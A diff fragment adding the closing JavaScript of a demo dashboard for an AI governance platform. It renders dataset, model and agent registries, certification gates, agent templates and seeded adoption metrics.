+    <div class="note" style="margin-top:12px"><span class="m">i</span><div>Classification lives in the govflow Access stage (<span class="mono">purpose_matrix.py</span>), joined onto the catalogue here. german_credit &times; marketing is refused at Access by <span class="ctl"><span class="st"></span>CTL-PURP-01</span>.</div></div>`;
+}
+function renderRegistry(){
+  const certCards = CERTS.map(c=>{
+    const gates = c.gates.map(g=>`<div style="display:flex;align-items:center;gap:8px;font-size:12px;padding:3px 0">
+      <span style="color:${g[1]==='ok'?'var(--ok)':'var(--danger)'};font-weight:800">${g[1]==='ok'?'✓':'✗'}</span><span>${g[0]}</span>${g[2]?` <span class="ctl"><span class="st"></span>${g[2]}</span>`:''}</div>`).join('');
+    return `<div class="card"><div class="card-h"><h3 class="mono" style="font-size:14px">${c.id} ${c.ver}</h3>${statusBadge(c.status)}</div>
+      <div class="card-b"><dl class="kv" style="margin-bottom:12px">
+        <dt>author</dt><dd class="mono">${c.author}</dd><dt>owner</dt><dd>${c.owner}</dd>
+        <dt>validator</dt><dd class="mono">${c.validator}</dd><dt>contract</dt><dd class="mono">${c.contract}</dd>
+        <dt>faithfulness</dt><dd class="mono" style="color:${c.faith>=0.90?'var(--ok-ink)':'var(--danger-ink)'}">${c.faith.toFixed(2)}</dd></dl>
+        <div class="eyebrow" style="margin-bottom:5px">Certification gates</div>${gates}
+        ${c.status==='candidate'?`<div class="note info" style="margin-top:11px"><span class="m">+</span><div>Assign any validator &ne; author and this flips to <b>certified</b>. Self-signoff is refused by <span class="ctl"><span class="st"></span>CTL-SOD-01</span>.</div></div>`:''}</div></div>`;
+  }).join('');
+  const modelRows = MODELS.map(m=>`<tr class="${m.status==='promoted'?'rowgood':'rowbad'}"><td class="mono">${m.ver}</td><td class="mono">${m.q}</td><td class="num">${m.auc}</td><td class="num">${m.dr}</td>
+    <td>${m.fair?'<span class="badge ok">pass</span>':'<span class="badge danger">fail</span>'}</td><td>${statusBadge(m.status)}</td><td><span class="badge neutral">${m.origin}</span></td></tr>`).join('');
+  const agentRows = AGENTS.map(a=>`<tr><td class="mono">${a.id}</td><td class="mono">${a.tpl}</td><td class="mono" style="font-size:11px">${a.tools}</td><td style="font-size:11.5px;color:var(--muted)">${a.rbac}</td><td><span class="badge ok">passing</span></td></tr>`).join('');
+  return `<p class="lede" style="margin-bottom:14px">The MRM inventory. Status is <b>computed from gates, never stored</b>: eval floor, owner-is-a-person, declared contract, and an independent validator. This is what the Plan stage is gated by.</p>
+    <div class="subsec"><span class="eyebrow">Analysis certification lifecycle</span><div class="rowflex">${certCards}</div></div>
+    <div class="subsec"><span class="eyebrow">Models (MRM inventory)</span><div class="tbl-wrap"><table><thead><tr><th>version</th><th>question</th><th class="num">auc</th><th class="num">disparity</th><th>fairness</th><th>status</th><th>origin</th></tr></thead><tbody>${modelRows}</tbody></table></div></div>
+    <div class="subsec"><span class="eyebrow">Agents (live harness)</span><div class="tbl-wrap"><table><thead><tr><th>agent</th><th>template</th><th>tools</th><th>rbac scope</th><th>eval</th></tr></thead><tbody>${agentRows}</tbody></table></div></div>
+    <div class="note" style="margin-top:14px"><span class="m">&#8593;</span><div><span class="mono">plan_visible_entries()</span> returns only <b>certified</b> analyses, so cohort-retention (refused) can never reach a user through Plan.</div></div>`;
+}
+function renderPlatform(){
+  const tpl = TEMPLATES.map(t=>`<div class="card"><div class="card-h"><h3 style="font-size:14px">${t.name}</h3>${statusBadge(t.status)}</div>
+    <div class="card-b"><dl class="kv"><dt>pattern</dt><dd class="mono">${t.pattern}</dd><dt>tools</dt><dd class="mono" style="font-size:11px">${t.tools}</dd><dt>RBAC</dt><dd style="font-size:11.5px">${t.rbac}</dd><dt>realized by</dt><dd class="mono">${t.by}</dd></dl></div></div>`).join('');
+  const pb = PLAYBOOKS.map(p=>`<tr><td>${p.title}</td><td class="mono">${p.pattern}</td><td>${statusBadge(p.status)}</td><td style="font-size:11.5px;color:var(--muted)">${p.by}</td></tr>`).join('');
+  const pat = PATTERNS.map(p=>`<span class="badge ${p.status==='in_use'?'ok':p.status==='avoided'?'danger':'warn'}">${p.id} &middot; ${p.status.replace('_',' ')}</span>`).join(' ');
+  return `<p class="lede" style="margin-bottom:14px">Reusable agent blueprints (tool allow-list + RBAC scope), the playbooks that assemble them, and the architecture patterns, anchored on Anthropic's Building Effective Agents.</p>
+    <div class="metrics" style="margin-bottom:18px">
+      <div class="metric"><div class="mv">5</div><div class="ml">Templates</div><div class="md">3 live</div></div>
+      <div class="metric"><div class="mv">4/4</div><div class="ml">Agent coverage</div><div class="md">100% of live agents</div></div>
+      <div class="metric"><div class="mv">3</div><div class="ml">Playbooks</div><div class="md">1 implemented, 2 template</div></div>
+      <div class="metric"><div class="mv">5</div><div class="ml">Patterns</div><div class="md">2 in use, 1 avoided by design</div></div></div>
+    <div class="subsec"><span class="eyebrow">Reusable agent templates</span><div class="rowflex">${tpl}</div></div>
+    <div class="subsec"><span class="eyebrow">AI playbooks</span><div class="tbl-wrap"><table><thead><tr><th>job to be done</th><th>pattern</th><th>status</th><th>implemented by</th></tr></thead><tbody>${pb}</tbody></table></div></div>
+    <div class="subsec"><span class="eyebrow">Architecture pattern catalog</span><div class="breakrow">${pat}</div></div>`;
+}
+function renderAdoption(){
+  const max=Math.max(...WEEKLY.map(w=>w[1]));
+  const bars=WEEKLY.map(w=>`<div class="bcol"><div class="bar" style="height:${Math.round(w[1]/max*100)}%"><span class="v">${w[1]}</span></div><div class="bcap">${w[0]}</div></div>`).join('');
+  const use=[['profiler',29],['eda',29],['modeler',29],['validator',26]];
+  const abars=use.map(a=>`<div class="bcol"><div class="bar" style="height:${Math.round(a[1]/29*100)}%;background:linear-gradient(180deg,var(--ok),var(--ok-ink))"><span class="v">${a[1]}</span></div><div class="bcap">${a[0]}</div></div>`).join('');
+  return `<p class="lede" style="margin-bottom:14px">Downstream aggregation over the model registry that every run writes into. Shows the platform is compounding, not just accumulating one-offs.</p>
+    <div class="metrics" style="margin-bottom:20px">
+      <div class="metric"><div class="mv">29</div><div class="ml">Total runs</div><div class="md">seeded W26-W28</div></div>
+      <div class="metric"><div class="mv">67%</div><div class="ml">Promotion rate</div><div class="md">promoted / total</div></div>
+      <div class="metric"><div class="mv">12%</div><div class="ml">Override rate</div><div class="md">human rejected</div></div>
+      <div class="metric"><div class="mv">100%</div><div class="ml">Template coverage</div><div class="md">4/4 agents</div></div></div>
+    <div class="rowflex">
+      <div class="card"><div class="card-h"><h3>Runs per week</h3><span class="eyebrow">seeded demo history</span></div><div class="card-b"><div class="barchart">${bars}</div></div></div>
+      <div class="card"><div class="card-h"><h3>Agent utilization</h3><span class="eyebrow">invocations, all runs</span></div><div class="card-b"><div class="barchart">${abars}</div></div></div></div>
+    <div class="note" style="margin-top:14px"><span class="m">i</span><div>Rates shown are labeled demo telemetry over seeded history. In the enterprise deployment this view reads the platform's real run store.</div></div>`;
+}
+const SURF = {
+  datasets:{eyebrow:'Dataset registry', title:'Datasets', render:renderDatasets},
+  registry:{eyebrow:'Model & agent registry', title:'Registry', render:renderRegistry},
+  platform:{eyebrow:'Templates, playbooks, patterns', title:'Platform', render:renderPlatform},
+  adoption:{eyebrow:'Adoption & utilization', title:'Adoption', render:renderAdoption},
+};
+
+/* ---------- sidebar ---------- */
+const NAV = [
+  {group:'', items:[{sec:'home', label:'Overview', icon:'home'}]},
+  {group:'Workspace', items:[{sec:'run', label:'Run', icon:'play'}]},
+  {group:'Governance', items:[{sec:'datasets', label:'Datasets', icon:'db', cnt:'8'},{sec:'registry', label:'Registry', icon:'check', cnt:'3'}]},
+  {group:'Platform', items:[{sec:'platform', label:'Platform', icon:'grid', cnt:'5'},{sec:'adoption', label:'Adoption', icon:'chart'}]},
+];
+function buildSidebar(){
+  document.getElementById('sidenav').innerHTML = NAV.map(g=>
+    `<div class="navgroup">${g.group?`<div class="gl">${g.group}</div>`:''}${g.items.map(it=>
+      `<button class="navitem" data-sec="${it.sec}" onclick="showView('${it.sec}')"><span class="ic" aria-hidden="true">${SICON[it.icon]}</span>${it.label}${it.cnt?`<span class="cnt">${it.cnt}</span>`:''}</button>`).join('')}</div>`).join('');
+}
+function buildTiles(){
+  const tile=(sec,statHTML,bodyHTML)=>{ const s=SURF[sec];
+    const ic = sec==='datasets'?'db':sec==='registry'?'check':sec==='platform'?'grid':'chart';
+    return `<div class="tile"><div class="tile-h"><span class="ic" aria-hidden="true">${SICON[ic]}</span><h3>${s.title}</h3><button class="open" aria-label="Open ${s.title}" onclick="showView('${sec}')">Open &rarr;</button></div><div class="tile-b">${statHTML}${bodyHTML}</div></div>`; };
+  const dsBreak=CLASS_ORDER.map(c=>`<span class="cls ${c.toLowerCase()}">${c} ${DATASETS.filter(d=>d.cls===c).length}</span>`).join(' ');
+  document.getElementById('tilegrid').innerHTML = [
+    tile('datasets',`<div class="tile-stat"><span class="big">8</span><span class="unit">datasets under classification</span></div>`,`<div class="breakrow" style="margin-top:13px">${dsBreak}</div>`),
+    tile('registry',`<div class="tile-stat"><span class="big">3</span><span class="unit">analyses in the certification lifecycle</span></div>`,`<div class="breakrow" style="margin-top:13px">${statusBadge('certified')} ${statusBadge('candidate')} ${statusBadge('refused')}</div>`),
+    tile('platform',`<div class="tile-stat"><span class="big">5</span><span class="unit">agent templates &middot; 3 live</span></div>`,`<div class="breakrow" style="margin-top:13px"><span class="badge ok">4/4 agents covered</span> <span class="badge warn">2 available</span></div>`),
+    tile('adoption',`<div class="tile-stat"><span class="big">29</span><span class="unit">governed runs &middot; 67% promoted</span></div>`,`<div class="barchart" style="height:70px;padding-top:14px">${WEEKLY.map(w=>`<div class="bcol"><div class="bar" style="height:${Math.round(w[1]/14*100)}%"><span class="v">${w[1]}</span></div><div class="bcap">${w[0].replace('2026-','')}</div></div>`).join('')}</div>`),
+  ].join('');
+}
+
+/* ---------- view switching ---------- */
+let currentView = 'home';
+function showView(name){
+  currentView = name;
+  const isSurf = name in SURF;
+  document.getElementById('view-home').classList.toggle('show', name==='home');
+  document.getElementById('view-run').classList.toggle('show', name==='run');
+  document.getElementById('view-surface').classList.toggle('show', isSurf);
+  if(isSurf){ const s=SURF[name]; document.getElementById('surf-eyebrow').textContent=s.eyebrow; document.getElementById('surf-title').textContent=s.title; document.getElementById('surf-body').innerHTML=s.render(); }
+  document.getElementById('navbar').style.display = name==='run' ? '' : 'none';
+  document.querySelectorAll('#sidenav .navitem').forEach(b=>{ const on=b.dataset.sec===name; b.classList.toggle('active', on); if(on) b.setAttribute('aria-current','page'); else b.removeAttribute('aria-current'); });
+  window.scrollTo({top:0, behavior: reduceMotion()?'auto':'smooth'});
+}
+/* Restore the run's interactive showpieces so a re-launch replays from scratch. */
+function resetRun(){
+  const a1=document.getElementById('gate-attempt1'); if(a1) a1.style.display='';
+  const a2=document.getElementById('gate-attempt2'); if(a2) a2.style.display='none';
+  const fb=document.getElementById('fixbtn'); if(fb){ fb.disabled=false; fb.innerHTML='&#9881; Fix it &mdash; regenerate with the failure fed back'; }
+  const ns=document.getElementById('narstart'); if(ns) ns.style.display='';
+  const np=document.getElementById('narpending'); if(np) np.style.display='none';
+  const nb=document.getElementById('narbody'); if(nb) nb.style.display='none';
+  const par=document.getElementById('narpara'); if(par){ par.classList.remove('caret'); par.textContent=''; }
+  const nf=document.getElementById('narfaith'); if(nf) nf.style.display='none';
+  buildRail(); /* rebuilds the Stage-5 rail tag that fixIt() mutated inline */
+  currentSub=1;
+}
+function startRun(){ showView('run'); resetRun(); transitionTo(1); }
+function goRun(s,sub){ showView('run'); resetRun(); pendingSub = sub || 1; transitionTo(s||1); }
+function goStack(){ showView('run'); transitionTo(10); }
+
+document.addEventListener('keydown',e=>{
+  const drawerOpen=document.getElementById('drawer').classList.contains('show');
+  const modalOpen=document.getElementById('modal').classList.contains('show');
+  if(e.key==='Escape'){ closeDrawer(); closeControls(); }
+  if(currentView!=='run' || drawerOpen || modalOpen) return;
+  if(e.key==='ArrowRight') go(1);
+  if(e.key==='ArrowLeft') go(-1);
+});
+
+buildRail();
+buildAttested();
+buildPersonas();
+buildSidebar();
+buildTiles();
+updateThemeBtn(currentIsDark());
+applyScreenState();
+showStage(1);
+showSub(1);
+showView('home');
+
+/* publish the real topbar height so the sticky sidebar offset never guesses */
+(function(){
+  const tb=document.querySelector('.topbar'); if(!tb) return;
+  const setH=()=>document.documentElement.style.setProperty('--topbar-h', tb.offsetHeight+'px');
+  setH();
+  if(window.ResizeObserver){ new ResizeObserver(setH).observe(tb); }
+  window.addEventListener('resize', setH);
+})();
+</script>
+</body>
+</html>
